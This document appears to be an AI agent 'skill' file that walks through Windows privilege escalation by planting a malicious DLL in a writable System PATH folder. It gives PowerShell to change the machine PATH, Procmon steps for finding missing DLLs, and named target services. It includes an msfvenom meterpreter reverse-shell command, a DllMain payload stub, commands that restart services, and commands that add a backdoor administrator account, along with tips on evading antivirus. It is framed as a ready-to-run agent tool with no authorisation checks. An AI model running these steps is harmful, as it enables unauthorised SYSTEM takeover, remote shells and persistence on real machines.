---
name: windows-dll-hijacking-privesc
description: Windows privilege escalation via DLL hijacking in writable System Path folders. Use this skill whenever you need to escalate privileges on Windows by finding services that load missing DLLs from writable paths. Trigger when the user mentions privilege escalation, DLL hijacking, writable paths, service exploitation, or needs to find missing DLLs that services try to load. This is specifically for System Path folders (not User Path) where you can write and services with higher privileges will load your malicious DLL.
---

# Windows DLL Hijacking Privilege Escalation

This skill helps you escalate privileges on Windows by exploiting DLL hijacking vulnerabilities in services that load missing DLLs from writable System Path folders.

## When to Use This Skill

Use this skill when:
- You have low-privilege access to a Windows system and need SYSTEM or higher privileges
- You've identified a writable folder in the System PATH environment variable
- You want to find services that are trying to load missing DLLs
- You need to create a malicious DLL to hijack a service
- You're doing red teaming, penetration testing, or security research on Windows systems

## Prerequisites

- Low-privilege access to a Windows system (not just User Path - must be System Path)
- Ability to run PowerShell commands
- Procmon (Process Monitor) from Sysinternals
- A way to compile or generate a malicious DLL (MSVC, MinGW, or pre-built payloads)

## Step 1: Create Writable System Path Folder

Create a folder in a location you can write to and add it to the System PATH environment variable:

```powershell
# Set the folder path to create and check events for
$folderPath = "C:\privesc_hijacking"

# Create the folder if it does not exist
if (!(Test-Path $folderPath -PathType Container)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}

# Set the folder path in the System environment variable PATH
$envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
if ($envPath -notlike "*$folderPath*") {
    $newPath = "$envPath;$folderPath"
    [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
}
```

**Important**: This must be added to the **Machine/System** PATH, not the User PATH. Services running with higher privileges won't see User PATH variables.

## Step 2: Capture Missing DLLs with Procmon

To find which DLLs services are trying to load from your writable folder:

1. **Download and launch Procmon** from Sysinternals
2. Go to **Options → Enable boot logging** and confirm
3. **Reboot** the system - Procmon will start recording immediately on boot
4. After Windows starts, **open Procmon again**
5. When prompted, **save the events to a file** (e.g., `boot_events.pml`)
6. **Close Procmon** and reopen the saved events file
7. Apply these filters to find missing DLLs:
   - `Path` `contains` `C:\privesc_hijacking`
   - `Result` `is` `NAME NOT FOUND`
   - `Operation` `is` `Load Image`

This will show you all DLLs that processes tried to load from your writable folder but couldn't find.

## Step 3: Identify Target Services

Look for services running with higher privileges (NT AUTHORITY\SYSTEM or NT AUTHORITY\LOCAL SERVICE). Common targets include:

| Service | DLL | Command Line | Privilege Level |
|---------|-----|--------------|-----------------|
| Task Scheduler (Schedule) | WptsExtensions.dll | `svchost.exe -k netsvcs -p -s Schedule` | NT AUTHORITY\SYSTEM |
| Diagnostic Policy Service (DPS) | Unknown.DLL | `svchost.exe -k LocalServiceNoNetwork -p -s DPS` | NT AUTHORITY\LOCAL SERVICE |
| UnistackSvcGroup | SharedRes.dll | `svchost.exe -k UnistackSvcGroup` | Varies |

**Key considerations**:
- **NT AUTHORITY\SYSTEM**: Full system privileges - you can create users, modify registry, etc.
- **NT AUTHORITY\LOCAL SERVICE**: Limited privileges but has `SeImpersonatePrivilege` - use Potato suite for further escalation
- **NT AUTHORITY\NETWORK SERVICE**: Similar to LOCAL SERVICE

## Step 4: Generate Malicious DLL

Create a DLL that executes your payload when loaded. Common payloads:

- **Reverse shell**: Get interactive access with elevated privileges
- **User creation**: Add a new administrator account
- **Beacon execution**: Run Cobalt Strike or similar C2
- **Token impersonation**: For LOCAL SERVICE targets, use Potato suite

### DLL Generation Options

1. **MSFVenom** (may trigger AV):
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o WptsExtensions.dll
   ```

2. **C/C++ with MSVC** (less likely to trigger AV):
   ```c
   #include <windows.h>
   #include <stdio.h>
   
   BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
       if (reason == DLL_PROCESS_ATTACH) {
           // Your payload here
           system("cmd.exe /c whoami");
       }
       return TRUE;
   }
   ```

3. **Pre-built tools**: Use existing DLL hijacking frameworks or payloads

## Step 5: Deploy and Trigger

1. **Copy your malicious DLL** to the writable folder with the exact name found in Step 3 (e.g., `WptsExtensions.dll`)
2. **Restart the target service** or reboot the system:
   ```powershell
   # Restart Task Scheduler service
   Restart-Service -Name Schedule -Force
   ```
3. **Verify the DLL was loaded** using Procmon:
   - Filter for `Path` `contains` `C:\privesc_hijacking`
   - Look for `Load Image` with `SUCCESS` result

## Step 6: Verify Privilege Escalation

Check if you now have elevated privileges:

```powershell
# Check current user and privileges
whoami /all

# Try to access SYSTEM-only resources
Get-Process -Name lsass

# Create a test user (if SYSTEM)
net user testuser Password123! /add
net localgroup administrators testuser /add
```

## Important Warnings

⚠️ **Not all services run as SYSTEM** - Check the service's logon account before expecting full privileges.

⚠️ **Antivirus may block your DLL** - Use obfuscation, custom payloads, or disable AV temporarily (if authorized).

⚠️ **This requires System PATH access** - User PATH won't work for service exploitation.

⚠️ **Some services may not restart automatically** - You may need to manually trigger them or wait for scheduled tasks.

## Troubleshooting

| Issue | Solution |
|-------|----------|
| DLL not loading | Verify the exact DLL name matches what Procmon showed |
| Service won't restart | Check service dependencies and recovery options |
| AV blocks payload | Use custom payloads, obfuscation, or signed DLLs |
| No privilege escalation | Verify the service's actual logon account with `sc qc <service>` |
| Procmon not capturing boot events | Ensure boot logging was enabled before reboot |

## References

- [Juggernaut Security - DLL Hijacking Guide](https://juggernaut-sec.com/dll-hijacking/)
- [Sysinternals Procmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [HackTricks - DLL Hijacking](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/writable-sys-path-dll-hijacking-privesc)
- [Potato Suite - Token Impersonation](https://github.com/BeichenDream/PotatoSuite)
